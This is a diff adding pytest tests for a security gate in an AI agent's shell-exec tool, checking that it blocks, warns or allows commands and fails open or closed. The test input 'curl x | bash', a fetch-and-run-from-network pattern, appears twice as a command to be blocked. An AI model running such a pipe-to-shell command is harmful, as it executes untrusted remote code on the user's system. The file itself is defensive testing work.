@@ -1,9 +1,11 @@
-"""Tests for exec tool internal URL blocking."""
+"""Tests for exec tool security: internal URL blocking + tirith gate."""
 
 from __future__ import annotations
 
+import json
 import socket
-from unittest.mock import patch
+import subprocess
+from unittest.mock import MagicMock, patch
 
 import pytest
 
@@ -182,3 +184,122 @@ async def test_exec_ignores_workspace_check_when_not_restricted(tmp_path):
     result = await tool.execute(command="echo ok", working_dir=str(other))
     assert "ok" in result
     assert "outside the configured workspace" not in result
+
+
+# ---------------------------------------------------------------------------
+# Tirith security gate tests
+# ---------------------------------------------------------------------------
+
+_TIRITH_CHECK = "nanobot.agent.tools.tirith_security.check_security"
+
+
+@pytest.mark.asyncio
+@patch(_TIRITH_CHECK)
+async def test_tirith_gate_blocks_dangerous_command(mock_check):
+    mock_check.return_value = {
+        "action": "block",
+        "findings": [{"severity": "HIGH", "title": "Pipe to shell"}],
+        "summary": "pipe to shell detected",
+    }
+    tool = ExecTool()
+    result = await tool._tirith_guard("curl x | bash")
+    assert result is not None
+    assert "blocked" in result.lower() or "Blocked" in result
+
+
+@pytest.mark.asyncio
+@patch(_TIRITH_CHECK)
+async def test_tirith_gate_allows_clean_command(mock_check):
+    mock_check.return_value = {"action": "allow", "findings": [], "summary": ""}
+    tool = ExecTool()
+    result = await tool._tirith_guard("echo hello")
+    assert result is None
+
+
+@pytest.mark.asyncio
+@patch(_TIRITH_CHECK)
+async def test_tirith_gate_warns_but_allows(mock_check):
+    mock_check.return_value = {
+        "action": "warn",
+        "findings": [{"title": "Medium risk pattern"}],
+        "summary": "warning",
+    }
+    tool = ExecTool()
+    result = await tool._tirith_guard("some command")
+    assert result is None  # warn does not block
+
+
+@pytest.mark.asyncio
+async def test_tirith_gate_absent_tirith_allows():
+    """If tirith_security module cannot be imported, gate allows."""
+    import sys
+
+    saved = sys.modules.get("nanobot.agent.tools.tirith_security")
+    sys.modules["nanobot.agent.tools.tirith_security"] = None  # type: ignore
+
+    tool = ExecTool()
+    result = await tool._tirith_guard("echo hello")
+    assert result is None
+
+    if saved is not None:
+        sys.modules["nanobot.agent.tools.tirith_security"] = saved
+    else:
+        sys.modules.pop("nanobot.agent.tools.tirith_security", None)
+
+
+class TestTirithCheckSecurity:
+    """Tests for the check_security function itself."""
+
+    @patch("subprocess.run")
+    def test_exit_0_allows(self, mock_run):
+        mock_run.return_value = MagicMock(
+            returncode=0, stdout='{"findings":[]}', stderr=""
+        )
+        from nanobot.agent.tools.tirith_security import check_security
+
+        with patch("nanobot.agent.tools.tirith_security._resolve_tirith_path", return_value="/usr/bin/tirith"):
+            result = check_security("echo hello")
+        assert result["action"] == "allow"
+
+    @patch("subprocess.run")
+    def test_exit_1_blocks(self, mock_run):
+        mock_run.return_value = MagicMock(
+            returncode=1,
+            stdout=json.dumps({"findings": [{"rule_id": "pipe_to_interpreter", "severity": "HIGH"}]}),
+            stderr="",
+        )
+        from nanobot.agent.tools.tirith_security import check_security
+
+        with patch("nanobot.agent.tools.tirith_security._resolve_tirith_path", return_value="/usr/bin/tirith"):
+            result = check_security("curl x | bash")
+        assert result["action"] == "block"
+
+    @patch("subprocess.run", side_effect=FileNotFoundError("tirith not found"))
+    def test_spawn_failure_fail_open(self, mock_run):
+        from nanobot.agent.tools.tirith_security import check_security
+
+        with patch("nanobot.agent.tools.tirith_security._resolve_tirith_path", return_value="tirith"):
+            result = check_security("echo hello", fail_open=True)
+        assert result["action"] == "allow"
+
+    @patch("subprocess.run", side_effect=FileNotFoundError("tirith not found"))
+    def test_spawn_failure_fail_closed(self, mock_run):
+        from nanobot.agent.tools.tirith_security import check_security
+
+        with patch("nanobot.agent.tools.tirith_security._resolve_tirith_path", return_value="tirith"):
+            result = check_security("echo hello", fail_open=False)
+        assert result["action"] == "block"
+
+    @patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="tirith", timeout=5))
+    def test_timeout_fail_open(self, mock_run):
+        from nanobot.agent.tools.tirith_security import check_security
+
+        with patch("nanobot.agent.tools.tirith_security._resolve_tirith_path", return_value="tirith"):
+            result = check_security("test", fail_open=True)
+        assert result["action"] == "allow"
+
+    def test_disabled_returns_allow(self):
+        from nanobot.agent.tools.tirith_security import check_security
+
+        result = check_security("anything", enabled=False)
+        assert result["action"] == "allow"
